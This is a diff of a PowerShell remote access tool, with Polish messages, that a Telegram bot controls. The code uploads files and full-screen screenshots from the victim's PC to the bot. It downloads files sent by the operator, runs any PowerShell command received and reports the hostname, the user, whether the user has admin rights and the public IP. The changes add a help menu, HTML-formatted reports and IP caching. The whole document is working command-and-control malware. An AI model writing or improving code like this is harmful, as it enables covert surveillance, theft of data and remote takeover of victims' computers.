@@ -12,12 +12,15 @@ $api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_to
 $session_id                 = $env:COMPUTERNAME
 $Global:ProgressPreference  = 'SilentlyContinue'
 
+try   { $script:CachedIP = Invoke-RestMethod -Uri "ident.me" -WebSession $session -TimeoutSec 5 }
+catch { $script:CachedIP = "unknown" }
+
+$script:IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
 function CheckAdminRights
 {
-    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
-    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if ($elevated) { return ("Użytkownik '$env:USERNAME' ma uprawnienia administratora") }
-    else { return ("Użytkownik '$env:USERNAME' nie ma uprawnień administratora") }
+    if ($script:IsAdmin) { return ("Uzytkownik '$env:USERNAME' ma uprawnienia administratora") }
+    else                 { return ("Uzytkownik '$env:USERNAME' nie ma uprawnien administratora") }
 }
 
 function DownloadFile($file_id, $file_name)
@@ -25,18 +28,18 @@ function DownloadFile($file_id, $file_name)
     $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
     $file_path      = $get_file_path.result.file_path
     Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
-    if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" }
-    else { SendMessage "Plik nie został pobrany" }
+    if (Test-Path -Path $file_name) { SendMessage "Plik zostal pobrany pomyslnie" }
+    else                            { SendMessage "Plik nie zostal pobrany" }
 }
 
 function SendFile($filePath)
 {
-    SendMessage "Przystępuję do wysłania pliku [$($filePath)]"
+    SendMessage "Przystepuje do wyslania pliku [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
         try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null }
-        catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" }
+        catch { SendMessage "Blad podczas przesylania pliku: [$($Error[0])]" }
     }
-    else { SendMessage "Wskazany plik nie został znaleziony" }
+    else { SendMessage "Wskazany plik nie zostal znaleziony" }
 }
 
 function SendScreenshot
@@ -49,34 +52,40 @@ function SendScreenshot
     $bottom = [Int32]::MinValue
     foreach ($screen in [Windows.Forms.Screen]::AllScreens)
     {
-        if ($screen.Bounds.X -lt $left) { $left = $screen.Bounds.X; }
-        if ($screen.Bounds.Y -lt $top) { $top = $screen.Bounds.Y; }
-        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right) { $right = $screen.Bounds.X + $screen.Bounds.Width; }
-        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height; }
+        if ($screen.Bounds.X -lt $left)                            { $left = $screen.Bounds.X }
+        if ($screen.Bounds.Y -lt $top)                             { $top = $screen.Bounds.Y }
+        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right)   { $right = $screen.Bounds.X + $screen.Bounds.Width }
+        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height }
     }
-    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom);
-    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height;
-    $graphics = [Drawing.Graphics]::FromImage($bmp);
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
-    $bmp.Save("$env:APPDATA\screenshot.png");
-    $graphics.Dispose();
-    $bmp.Dispose();
+    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$env:APPDATA\screenshot.png")
+    $graphics.Dispose()
+    $bmp.Dispose()
     SendFile "$env:APPDATA\screenshot.png"
     Remove-Item -Path "$env:APPDATA\screenshot.png" -Force
 }
 
 function SendMessage($output, $cmd)
 {
-    # To escape _*``[\
-    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
+    $output = $output -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;'
+    $path   = ((Get-Location).Path).Replace("\", "/")
+    $admin  = if ($script:IsAdmin) { "Admin" } else { "User" }
+
+    $header  = "<code>$session_id</code> | $env:USERNAME | $admin`n"
+    $header += "IP: <code>$script:CachedIP</code>`n"
+    $header += "<code>$path</code>"
+    if ($cmd) { $header += " &gt; <code>$cmd</code>" }
+    $header += "`n&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;`n"
+    $header += "<pre>$output</pre>"
 
     $MessageToSend = @{
         chat_id    = $telegram_id
-        parse_mode = "MarkdownV2"
-        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`SESSION ID: $session_id`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
-    }
-
-    $MessageToSend = $MessageToSend | ConvertTo-Json
+        parse_mode = "HTML"
+        text       = $header
+    } | ConvertTo-Json
 
     try {
         Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
@@ -129,7 +138,7 @@ function CommandListener
                 $document = $message.document
 
                 if ($user_id -notmatch $telegram_id) {
-                    SendMessage ('Użytkownik [{0}] {1} nieupoważniona osoba wysłała do bota następujące polecenie: {2}' -f $user_id, $username, $text)
+                    SendMessage ('Uzytkownik [{0}] {1} nieupowazniona osoba wyslala do bota nastepujace polecenie: {2}' -f $user_id, $username, $text)
                     continue
                 }
 
@@ -139,6 +148,17 @@ function CommandListener
                 if ($text -match "/online")          { SendMessage "Sesja aktywna" $text; continue }
                 if ($sid[0] -notmatch $session_id)   { continue }
                 if ($text -match "exit")             { SendMessage "Sesja zabita" $text; exit }
+
+                if ($text -match "^/help") {
+                    $help = @(
+                        "/online        - sprawdz aktywne sesje (broadcast)",
+                        "/help          - lista komend",
+                        "exit           - zakoncz sesje na tym PC",
+                        "&lt;komenda PS&gt;   - wykonaj dowolne polecenie PowerShell"
+                    ) -join "`n"
+                    SendMessage $help $text
+                    continue
+                }
 
                 if ($text.Length -gt 0) {
                     try {
